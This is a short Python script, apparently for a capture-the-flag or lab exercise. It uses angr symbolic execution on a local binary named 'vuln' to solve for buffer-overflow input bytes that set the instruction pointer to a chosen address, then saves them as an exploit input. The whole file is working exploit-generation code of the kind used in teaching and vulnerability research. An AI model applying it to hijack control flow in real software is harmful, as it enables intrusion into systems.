import angr
import claripy
import sys

proj = angr.Project("./vuln") # Initialize the project
init_state = proj.factory.entry_state() # Initialize the initial state
bitvector_size = 90*8 # Define the bitvector size
buffer = claripy.BVS('buffer', bitvector_size) # Define the bitvector buffer

class ScanfReplace(angr.SimProcedure): # Define a SimProcedure to replace the input function
    def run(self, format_string, scanf_addr):
        self.state.memory.store(scanf_addr, buffer)
        
hook_addr = 0x401040 # Define the address of the input function
target_addr = 0x401146 # Define the target address
proj.hook(hook_addr, ScanfReplace()) # Hook the input function with the SimProcedure
sim = proj.factory.simgr(init_state) # Define the simulation manager with the initial state

while not sim.unconstrained: # Find an unconstrained state
     sim.step()

state = sim.unconstrained[0] # Save the first unconstrained state
state.add_constraints(state.regs.rip == target_addr) # Add a constraint to match the RIP register with the target address
result = state.solver.eval(buffer, cast_to=bytes) # Use the state solver to evaluate the bitvector according to the constraint
print("USE THE FOLLOWING INPUT BYTES TO EXPLOIT THE OVERFLOW:")
print(result)
with open("input.txt", "wb") as input_file:
    input_file.write(result)

print("SAVED AS input.txt")
